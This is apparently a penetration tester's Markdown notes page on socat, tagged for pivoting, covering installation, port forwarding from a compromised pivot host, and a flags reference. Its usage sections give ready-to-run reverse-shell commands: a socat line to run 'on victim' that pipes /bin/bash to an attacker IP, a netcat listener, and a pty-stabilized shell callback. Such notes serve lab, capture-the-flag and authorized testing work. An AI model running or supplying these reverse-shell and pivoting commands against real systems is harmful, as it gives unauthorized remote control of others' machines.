---
tags:
  - tool
category: pivoting
---

# Socat

## Description

Socat is a two-direction relay tool that allows you to create pipe sockets between two networks without needing to use SSH. It acts as a redirect that listens on one host and then port forwards that data to a different IP address and port. More flexible than netcat (it can bridge two very different endpoint types - TCP, UDP, files, ttys, exec'd processes) at the cost of a fussier syntax.

## Installation

```bash
sudo apt install socat
# check whether it's already on the target too - it's common on Linux boxes
which socat
```

## Common Usage

*Starting a Socat listener*
```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
> This command is being run on the pivot host that we have gotten access to
> TCP4-LISTEN is the port that Socat will listen on
> TCP4 is our attack machine IP address and port 80 is where the traffic will be sent to

*Run this on victim*
```bash
socat TCP4:10.10.14.5:8443 EXEC:/bin/bash
```

*Run on attack host*
```bash
nc -lvnp 8443
```

## Stabilize the Socat Shell

*Run on attack host*
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4443
```

*Run from the initial nc connection*
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443
```

> If all goes as planned, we'll have a stable reverse shell connection on our Socat listener.

## Flags Reference

| Option | Description |
|---|---|
| `TCP4-LISTEN:<port>` | Listen for a TCP connection on a port |
| `,fork` | Handle each new connection in a new process (needed for a listener to accept more than one connection) |
| `TCP4:<host>:<port>` | Connect out to a host/port |
| `EXEC:<cmd>` | Execute a command and pipe its stdio into the socket |
| `pty` | Allocate a pseudo-terminal (used for shell stabilization) |
| `stderr` | Merge stderr into the same stream |
| `setsid,sigint,sane` | Session/signal handling used to make the resulting shell behave like a real terminal |

## Example Output

```
$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
# (no output on success - runs until killed, forwarding each connection)
```

## Notes / Gotchas

- Socat's biggest advantage over netcat is that either side of a relay can be almost anything (file, exec, tty, TCP, UDP) - which is exactly what makes the shell-stabilization trick work (`file:`tty`` on one end, a pty-wrapped exec on the other).
- Confirm socat is actually present on the target before planning around it - it's common but not guaranteed to be installed by default the way netcat often is.

## Related

- [NetCat](NetCat.md)
- [Chisel](Chisel.md)
- [Stabilize Shell](../Knowledge%20Base/Misc/Stabilize%20Shell.md)
